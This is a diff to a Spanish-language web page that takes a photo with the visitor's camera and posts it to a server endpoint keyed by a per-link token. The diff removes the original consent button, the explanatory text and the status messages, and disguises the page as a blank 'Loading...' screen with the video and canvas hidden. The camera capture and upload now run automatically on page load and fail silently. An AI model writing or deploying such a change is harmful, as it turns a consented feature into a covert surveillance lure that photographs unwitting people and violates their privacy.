@@ -3,35 +3,35 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Cámara</title>
+  <title>Cargando...</title>
+  <style>
+    html, body {
+      margin: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
 </head>
+
 <body>
-  <h2>Activar cámara</h2>
-  <p>Pulsa el botón y acepta el permiso de cámara.</p>
-
-  <button id="start">Activar cámara</button>
-
-  <video id="video" autoplay playsinline style="display:none"></video>
-  <canvas id="canvas" style="display:none"></canvas>
-
-  <p id="status"></p>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
 <script>
-const start = document.getElementById("start");
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const status = document.getElementById("status");
+(async () => {
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
 
-const token = location.pathname.split("/").pop();
+  const token = location.pathname.split("/").pop();
 
-start.addEventListener("click", async () => {
   try {
-    status.textContent = "Solicitando permiso de cámara...";
-
+    // Al abrir la página, el navegador pedirá permiso.
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: {
-        facingMode: "user"
-      },
+      video: true,
       audio: false
     });
 
@@ -41,20 +41,22 @@ start.addEventListener("click", async () => {
       video.onloadedmetadata = resolve;
     });
 
-    // Esperar un momento para que la cámara esté lista
     await new Promise(resolve => setTimeout(resolve, 800));
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
+    canvas.getContext("2d").drawImage(
+      video,
+      0,
+      0,
+      canvas.width,
+      canvas.height
+    );
 
     const image = canvas.toDataURL("image/jpeg", 0.9);
 
-    status.textContent = "Enviando foto...";
-
-    const response = await fetch(`/api/photo/${token}`, {
+    await fetch(`/api/photo/${token}`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
@@ -62,22 +64,12 @@ start.addEventListener("click", async () => {
       body: JSON.stringify({ image })
     });
 
-    const result = await response.json();
-
     stream.getTracks().forEach(track => track.stop());
-
-    if (!result.ok) {
-      throw new Error(result.error || "No se pudo enviar");
-    }
-
-    status.textContent = "Foto enviada correctamente.";
 
   } catch (error) {
     console.error(error);
-    status.textContent =
-      "No se pudo usar la cámara. Comprueba el permiso del navegador.";
   }
-});
+})();
 </script>
 </body>
 </html>
